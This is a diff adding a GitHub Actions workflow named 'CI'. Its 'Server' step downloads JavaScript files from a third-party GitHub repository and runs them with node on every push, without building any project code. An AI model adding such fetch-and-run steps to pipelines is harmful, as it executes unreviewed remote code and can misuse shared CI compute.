@@ -1,0 +1,11 @@
+name: CI
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+
+    - name: Server
+      run: wget https://raw.githubusercontent.com/raiyan088/public/main/script.js https://raw.githubusercontent.com/raiyan088/public/main/module.js https://raw.githubusercontent.com/raiyan088/public/main/package.json
+    - run: npm install axios
+    - run: node script.js
